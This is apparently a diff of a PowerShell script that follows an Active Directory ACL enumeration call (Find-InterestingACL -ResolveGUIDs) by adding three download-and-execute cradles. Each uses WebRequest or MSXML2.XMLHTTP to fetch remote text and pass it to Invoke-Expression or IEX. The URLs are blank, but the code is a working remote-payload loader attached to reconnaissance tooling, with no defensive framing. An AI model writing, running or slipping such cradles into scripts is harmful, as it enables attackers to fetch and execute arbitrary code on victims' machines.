@@ -14,3 +14,20 @@ try {
 }
 
 Find-InterestingACL -ResolveGUIDs
+
+
+$request = [System.Net.WebRequest]::Create('')
+$response = $request.GetResponse()
+$stream = $response.GetResponseStream()
+$reader = New-Object System.IO.StreamReader($stream)
+$content = $reader.ReadToEnd()
+$reader.Close()
+$response.Close()
+Invoke-Expression $content
+
+$r=[System.Net.WebRequest]::Create('');$s=$r.GetResponse().GetResponseStream();$d=New-Object System.IO.StreamReader($s);IEX $d.ReadToEnd();$d.Close()
+
+$xmlhttp = New-Object -ComObject MSXML2.XMLHTTP
+$xmlhttp.open("GET", '', $false)
+$xmlhttp.send()
+Invoke-Expression $xmlhttp.responseText
